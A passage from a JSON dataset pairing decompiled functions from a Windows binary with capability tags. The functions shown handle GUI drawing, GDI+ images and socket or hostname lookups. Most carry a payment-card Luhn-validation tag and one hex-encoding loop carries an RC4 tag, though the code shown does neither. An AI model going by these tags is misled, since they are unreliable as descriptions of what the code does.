        "decompiled_code": "\nvoid __cdecl fcn.00459f80(int32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint var_4h;\n    \n    fcn.00418464(arg_8h, 0);\n    uVar1 = fcn.00453178();\n    uVar2 = fcn.004059dc(0xffffffff, arg_8h, uVar1 | 0xc10);\n    uVar2 = fcn.004256c0(uVar2);\n    sub.user32.dll_DrawTextA(uVar2);\n    *(arg_8h + 8) = *(arg_8h + 8) + 6;\n    *(arg_8h + 0xc) = *(arg_8h + 0xc) + 2;\n    return;\n}\n",
        "token_count": 180
    },
    "0045a070": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045a070(int32_t *arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t in_EDX;\n    int32_t lpRect;\n    int32_t var_14h;\n    uint lpPoint;\n    uint var_4h;\n    \n    sub.user32.dll_ClientToScreen();\n    sub.user32.dll_GetWindowRect();\n    *arg_8h = in_EDX - lpRect;\n    arg_8h[1] = in_ECX - var_14h;\n    return;\n}\n",
        "token_count": 120
    },
    "0045a478": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045a478(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 0x1c) = param_1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 155
    },
    "0045b950": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045b950(int32_t arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t in_EDX;\n    uint arg_8h_00;\n    uint *arg_ch;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.00418464(&var_1ch, *(*(arg_8h + -4) + 0x18) + in_EDX + -2);\n    fcn.004321c4();\n    cVar1 = fcn.004322cc();\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.004256c0(&var_1ch, 1, 0);\n        sub.user32.dll_DrawFrameControl(uVar2);\n    }\n    else {\n        fcn.004321c4();\n        fcn.0043250c();\n        arg_ch = &var_1ch;\n        arg_8h_00 = 0;\n        uVar2 = fcn.004256c0();\n        fcn.004321c4(uVar2);\n        fcn.00432388(arg_8h_00, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 265
    },
    "0045ba6c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045ba6c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    uint *arg_ch_00;\n    uint var_1ch;\n    uint var_ch;\n    \n    fcn.00418464(&var_1ch, arg_8h);\n    fcn.004321c4();\n    fcn.00432470();\n    arg_ch_00 = &var_1ch;\n    arg_8h_00 = 0;\n    uVar1 = fcn.004256c0();\n    fcn.004321c4(uVar1);\n    fcn.00432388(arg_8h_00, arg_ch_00);\n    return;\n}\n",
        "token_count": 171
    },
    "0045c7a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045c7a8(uint *param_1, uint param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint uVar2;\n    uint uVar3;\n    \n    uVar1 = *param_1;\n    uVar2 = param_1[1];\n    *(in_EAX + 0x60) = param_2;\n    fcn.00458594(uVar1, uVar2);\n    fcn.0045d5d8();\n    uVar1 = fcn.00458594();\n    *(in_EAX + 0x5c) = uVar1;\n    uVar3 = 0;\n    uVar2 = sub.user32.dll_GetDCEx(uVar1, 0, 0x412);\n    *(in_EAX + 0x58) = uVar2;\n    *(in_EAX + 0x50) = uVar1;\n    *(in_EAX + 0x54) = uVar3;\n    fcn.0045c8d0();\n    return;\n}\n",
        "token_count": 239
    },
    "0045ca4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045ca4c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t var_8h;\n    uint var_4h;\n    \n    if (*(param_2 + 0xc) == 0) {\n        var_8h = fcn.0045a9f4();\n        iVar1 = fcn.0045a554();\n        var_8h = var_8h + iVar1;\n    }\n    else {\n        var_8h = fcn.0045a9f4();\n    }\n    fcn.0045c9bc(&stack0xfffffffc);\n    return var_8h;\n}\n",
        "token_count": 155
    },
    "0045ca9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0045ca9c(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    uVar2 = 4;\n    if (param_2 != 0) {\n        fcn.00450150();\n        fcn.00450150();\n        if (((var_1ch < var_ch) || (var_14h <= var_4h)) || (var_8h < var_18h)) {\n            if (((var_20h < var_10h) || (var_18h <= var_8h)) || (var_4h < var_14h)) {\n                iVar1 = var_1ch + var_14h >> 1;\n                if (iVar1 < 0) {\n                    iVar1 = iVar1 + ((var_1ch + var_14h & 1U) != 0);\n                }\n                if (iVar1 <= var_ch) {\n                    uVar2 = 2;\n                }\n            }\n            else {\n                uVar2 = 3;\n            }\n        }\n        else {\n            uVar2 = 1;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 332
    },
    "0045ccd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045ccd0(char param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.0045ad48();\n    if (iVar1 == 0) {\n        if (param_1 != '\\0') {\n            fcn.00418428();\n            iVar1 = fcn.0045b52c();\n            if (iVar1 == 0) {\n                uVar2 = 0;\n            }\n            else {\n                uVar2 = *(iVar1 + 4);\n            }\n            fcn.0045ca9c(uVar2);\n            (**(*in_EAX + 0xc))();\n        }\n    }\n    else {\n        if (param_1 == '\\0') {\n            fcn.0045cb18(&stack0xfffffffc);\n        }\n        else {\n            fcn.0045cb98(&stack0xfffffffc);\n        }\n        (**(*in_EAX[5] + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 252
    },
    "0045cff0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045cff0(uint param_1, uint param_2)\n\n{\n    fcn.00403450(param_2, param_1);\n    return;\n}\n",
        "token_count": 41
    },
    "0045d020": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong __fastcall fcn.0045d020(int32_t param_1, uint param_2)\n\n{\n    uint uVar1;\n    int32_t iStack12;\n    \n    if (param_1 == 0) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = fcn.00403450(param_2);\n        iStack12 = param_1;\n    }\n    return CONCAT44(iStack12, uVar1);\n}\n",
        "token_count": 102
    },
    "0045d33c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045d33c(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *in_EAX;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x45d41d;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    iVar4 = (**(*in_EAX + 8))();\n    if (var_10h == 0x12) {\n        fcn.00405530();\n    }\n    else if ((iVar4 != 0) && ((var_10h == 2 || (var_10h == 0x14)))) {\n        fcn.00450150();\n        (***in_EAX)();\n        iVar2 = *(iVar4 + 0x40) * 2 - var_20h;\n        iVar3 = *(iVar4 + 0x44) * 2 - var_1ch;\n        iVar1 = *(iVar4 + 0x48);\n        iVar4 = *(iVar4 + 0x4c);\n        fcn.00450830();\n        fcn.00405584();\n        *in_ECX = iVar2;\n        in_ECX[1] = iVar3;\n        in_ECX[2] = iVar1 * -2 + var_18h * 3 + iVar2 * -2;\n        in_ECX[3] = iVar4 * -2 + var_14h * 3 + iVar3 * -2;\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x45d424;\n    uStack60 = 0x45d41c;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 500
    },
    "0045da7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0045da7c(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_ffffffac;\n    uint *puVar3;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    var_10h = 0;\n    var_4h = 0;\n    uStack48 = 0x45dbf4;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &iStack52;\n    puVar3 = &var_4h;\n    var_ch = sub.kernel32.dll_GetCurrentProcessId();\n    var_8h._0_1_ = 0;\n    fcn.0040afa0(puVar3);\n    fcn.00405584();\n    uVar1 = fcn.004059dc();\n    *0x49ac70 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    puVar3 = &var_10h;\n    sub.kernel32.dll_GetCurrentThreadId_1();\n    fcn.0040afa0(puVar3);\n    fcn.00405584();\n    uVar1 = fcn.004059dc();\n    *0x49ac72 = sub.kernel32.dll_GlobalAddAtomA(uVar1);\n    uVar1 = fcn.004059dc();\n    *0x49ac7c = sub.user32.dll_RegisterWindowMessageA(uVar1);\n    *0x49acb4 = fcn.00419acc();\n    fcn.0045d684();\n    *0x49ac5c = fcn.0045d430();\n    uVar1 = fcn.00443af4();\n    **0x495d00 = uVar1;\n    uVar1 = fcn.00444cfc();\n    **0x495b10 = uVar1;\n    fcn.00446d38();\n    fcn.0041927c();\n    iVar2 = sub.kernel32.dll_GetModuleHandleA_2(0x45dc30);\n    if (iVar2 != 0) {\n        *0x49364c = sub.kernel32.dll_GetProcAddress_1(iVar2, 0x45dc38);\n        in_stack_ffffffac = iVar2;\n    }\n    *in_FS_OFFSET = in_stack_ffffffac;\n    fcn.00405530(0x45dbfb);\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 617
    },
    "0045dc48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0045dc48(int32_t param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    in_EAX[1] = param_1;\n    (**(*in_EAX + 0x14))();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 180
    },
    "0045e400": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045e400(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    \n    cVar1 = fcn.00404704();\n    if (cVar1 == '\\0') {\n        cVar1 = sub.ole32.dll_IsEqualGUID(arg_ch, *(*(arg_8h + 4) + 0x30) + 0x20);\n        if (cVar1 == '\\0') {\n            uVar2 = 0x80004002;\n        }\n        else {\n            fcn.00404704();\n            uVar2 = 0;\n        }\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 172
    },
    "0045e3d4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045e3d4(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint unaff_retaddr;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    *(in_EAX + 4) = param_1;\n    *(in_EAX + 8) = 1;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 167
    },
    "0045f524": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0045f524(void)\n\n{\n    fcn.0045f580();\n    fcn.0045f6c8();\n    return;\n}\n",
        "token_count": 36
    },
    "0045f548": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045f548(uint *param_1)\n\n{\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    \n    fcn.0045eacc();\n    fcn.0045eaf0();\n    fcn.0045eb84();\n    *param_1 = uStack28;\n    param_1[1] = uStack24;\n    param_1[2] = uStack20;\n    param_1[3] = uStack16;\n    return;\n}\n",
        "token_count": 121
    },
    "0045f6c8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0045f6c8(void)\n\n{\n    uint8_t *in_EAX;\n    char *pcVar1;\n    int32_t iVar2;\n    \n    fcn.00405c6c();\n    pcVar1 = fcn.004059dc();\n    iVar2 = 0x10;\n    do {\n        *pcVar1 = \"0123456789abcdef\\x04\"[*in_EAX >> 4];\n        pcVar1[1] = \"0123456789abcdef\\x04\"[*in_EAX & 0xf];\n        pcVar1 = pcVar1 + 2;\n        in_EAX = in_EAX + 1;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 169
    },
    "0045f9ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045f9ac(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint in_EDX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = 0x45f9c1;\n    fcn.00407080();\n    uStack24 = 0x45fa02;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    uVar1 = *(in_EAX + 4);\n    puStack20 = &stack0xfffffffc;\n    sub.gdiplus.dll_GdipSaveImageToStream(uVar1, in_EDX);\n    fcn.0045fa38();\n    *in_FS_OFFSET = uVar1;\n    fcn.0040700c(0x45fa09, arg_8h);\n    return;\n}\n",
        "token_count": 218
    },
    "0045fa44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045fa44(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    var_4h = 0;\n    uVar1 = sub.gdiplus.dll_GdipCreateBitmapFromScan0(in_ECX, arg_ch, 0, arg_8h, 0, &var_4h);\n    *(in_EAX + 8) = uVar1;\n    fcn.0045fa34();\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_ECX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 230
    },
    "0045faa4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0045faa4(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint in_ECX;\n    uint extraout_ECX;\n    char in_DL;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint var_4h;\n    \n    if (in_DL != '\\0') {\n        in_EAX = fcn.00404974();\n        in_ECX = extraout_ECX;\n        in_DL = extraout_DL;\n    }\n    var_4h = 0;\n    uVar1 = sub.gdiplus.dll_GdipCreateBitmapFromHBITMAP(in_ECX, arg_8h, &var_4h);\n    *(in_EAX + 8) = uVar1;\n    fcn.0045fa34();\n    if (in_DL != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = in_ECX;\n    }\n    return in_EAX;\n}\n",
        "token_count": 219
    },
    "0045fafc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0045fafc(int32_t param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t extraout_ECX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    int32_t var_4h;\n    \n    if (param_2 != '\\0') {\n        var_4h = param_1;\n        in_EAX = fcn.00404974();\n        param_1 = extraout_ECX;\n        param_2 = extraout_DL;\n    }\n    var_4h = 0;\n    if (param_1 != 0) {\n        uVar1 = sub.gdiplus.dll_GdipGetImageGraphicsContext(*(param_1 + 4), &var_4h);\n        *(in_EAX + 8) = uVar1;\n    }\n    fcn.0045fbd4();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack36;\n    }\n    return in_EAX;\n}\n",
        "token_count": 247
    },
    "0045fd64": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0045fd64(uint arg_8h)\n\n{\n    uint *in_EAX;\n    uint arg_8h_00;\n    uint uVar1;\n    int32_t iVar2;\n    uint in_ECX;\n    uint in_EDX;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = in_ECX;\n    arg_8h_00 = fcn.0045fa14();\n    uVar1 = fcn.0045fa44(arg_8h_00, uVar1);\n    fcn.0045fafc();\n    if (arg_8h == '\\x01') {\n        fcn.0045fb7c();\n    }\n    else if (arg_8h == '\\x02') {\n        fcn.0045fb7c();\n    }\n    else if (arg_8h == '\\x03') {\n        fcn.0045fb7c();\n    }\n    iVar2 = fcn.0045fb98(in_ECX, in_EDX, 0);\n    fcn.00404650();\n    fcn.00404650();\n    *in_EAX = uVar1;\n    return iVar2 == 0;\n}\n",
        "token_count": 265
    },
    "0045fe14": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0045fe14(uint param_1, uint param_2)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint *arg_8h;\n    int32_t iStack104;\n    uint uStack100;\n    uchar *puStack96;\n    int32_t iStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint var_3ch;\n    uint var_2ch;\n    uint var_28h;\n    uint uStack40;\n    uint uStack36;\n    uint uStack32;\n    uint var_18h;\n    uint var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack80 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack84 = 0x45fef4;\n    iStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    puStack96 = 0x45fe44;\n    var_8h = param_2;\n    var_ch = fcn.0045faa4(param_2);\n    uStack100 = 0x45fed7;\n    iStack104 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff98;\n    puStack96 = &stack0xfffffffc;\n    fcn.0045fc80();\n    var_2ch = 1;\n    var_28h = **0x4958e8;\n    uStack40 = (*0x4958e8)[1];\n    uStack36 = (*0x4958e8)[2];\n    uStack32 = (*0x4958e8)[3];\n    var_14h = **0x495ccc;\n    var_18h = 1;\n    var_10h = &fcn.0045fe14::var_8h;\n    fcn.00420a8c(0);\n    fcn.00407024();\n    arg_8h = &fcn.0045fe14::var_2ch;\n    fcn.0045f9ac(arg_8h);\n    *in_FS_OFFSET = arg_8h;\n    iStack104 = 0x45fede;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 505
    },
    "0045ff18": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045ff18(uint arg_8h)\n\n{\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack56;\n    uint uStack52;\n    uchar *puStack48;\n    uint var_1ch;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack48 = &stack0xfffffffc;\n    uStack52 = 0x45ffdf;\n    uStack56 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc8;\n    puStack64 = 0x45ff4c;\n    fcn.0045faa4(var_ch);\n    uStack68 = 0x45ffc2;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    fcn.0045fd64(0);\n    fcn.0045fc80();\n    fcn.00420a8c(0);\n    fcn.00407024();\n    uVar1 = 0;\n    fcn.0045f9ac(0);\n    *in_FS_OFFSET = uVar1;\n    fcn.00404650(0x45ffc9);\n    return;\n}\n",
        "token_count": 301
    },
    "0046031c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046031c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0041ff70();\n    *(in_EAX + 0x30) = 0;\n    *(in_EAX + 0x31) = 0;\n    *(in_EAX + 0x34) = 0;\n    *(in_EAX + 0x38) = 0;\n    *(in_EAX + 0x3c) = 0;\n    *(in_EAX + 0x3e) = 0;\n    *(in_EAX + 0x40) = 0xffffffff;\n    *(in_EAX + 0x44) = 0;\n    *(in_EAX + 0x48) = 0;\n    *(in_EAX + 0x4c) = 0;\n    *(in_EAX + 0x50) = 0;\n    *(in_EAX + 0x54) = 0;\n    *(in_EAX + 0x58) = 0;\n    *(in_EAX + 0x5c) = 0;\n    *(in_EAX + 0x60) = 0;\n    *(in_EAX + 100) = 0;\n    *(in_EAX + 0x68) = 0;\n    *(in_EAX + 0x6c) = 0;\n    fcn.0040f498();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 416
    },
    "00460550": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00460550(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.0046031c();\n    *(in_EAX + 0x3c) = 2;\n    *(in_EAX + 0x3e) = 0;\n    fcn.00405530();\n    fcn.00405530();\n    fcn.00405530();\n    fcn.00405530();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 196
    },
    "004605b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004605b0(ushort *arg_8h)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = 0x4605d0;\n    fcn.004059cc();\n    puStack28 = 0x4605d8;\n    fcn.004059cc();\n    uStack32 = 0x460645;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    *arg_8h = 2;\n    puStack28 = &stack0xfffffffc;\n    fcn.00460654();\n    uVar2 = fcn.004059dc();\n    uVar2 = sub.wsock32.dll_inet_addr(uVar2);\n    *(arg_8h + 2) = uVar2;\n    uVar2 = fcn.0046072c();\n    uVar1 = sub.wsock32.dll_htons();\n    arg_8h[1] = uVar1;\n    *in_FS_OFFSET = uVar2;\n    uStack36 = 0x46064c;\n    fcn.00405530();\n    fcn.00405530();\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 315
    },
    "00460654": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "resolve DNS"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00460654(uint param_1, char *param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.00405530();\n    if (param_2 == NULL) {\n        fcn.00405584();\n    }\n    else if (*param_2 - 0x30U < 10) {\n        uVar1 = fcn.004059dc();\n        iVar2 = sub.wsock32.dll_inet_addr(uVar1);\n        if (iVar2 != -1) {\n            fcn.00405584();\n        }\n    }\n    else {\n        uVar1 = fcn.004059dc();\n        iVar2 = sub.wsock32.dll_gethostbyname(uVar1);\n        if (iVar2 != 0) {\n            fcn.0040afa0(param_1);\n        }\n    }\n    return;\n}\n",
        "token_count": 193
    },
    "00460768": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get hostname"
        ],
        "decompiled_code": "\nvoid fcn.00460768(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    uchar auStack264 [256];\n    \n    fcn.00405530();\n    sub.wsock32.dll_gethostname(auStack264, 0x100);\n    iVar1 = (**(*in_EAX + 0x38))();\n    if (iVar1 == 0) {\n        fcn.004057a0();\n    }\n    return;\n}\n",
        "token_count": 103
    },
    "00460804": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00460804(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00460550();\n    *(in_EAX + 0x80) = 0;\n    *(in_EAX + 0x88) = 0;\n    *(in_EAX + 0x8c) = 0;\n    *(in_EAX + 0x90) = 0;\n    *(in_EAX + 0x94) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 207
    },
    "00461a20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
